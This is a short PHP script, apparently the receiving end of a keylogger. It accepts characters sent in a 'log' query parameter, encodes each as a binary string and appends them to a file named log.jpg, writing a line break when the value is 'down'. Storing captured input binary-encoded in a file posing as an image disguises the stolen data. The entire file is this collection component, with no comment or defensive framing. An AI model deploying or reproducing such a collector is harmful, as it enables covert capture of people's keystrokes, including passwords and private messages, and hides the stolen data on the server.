<?php
function str2bin($str) {
    $bin = '';
    $length = strlen($str);
    for($i = 0; $i < $length; $i++) {
        $convert = decbin(ord($str[$i]));
        $convert = strrev(str_pad(strrev($convert), 8, '0'));
        $bin .= $convert;
    }
    return $bin;
}

if(!empty($_GET['log'])) {
    $f = fopen("log.jpg","a+");
    if($_GET['log'] != 'down'){
      fwrite($f,str2bin($_GET['log']));
    }else{
        fwrite($f,"\r");
        fwrite($f,"\n");
    } 
      fclose($f);
    } 

?>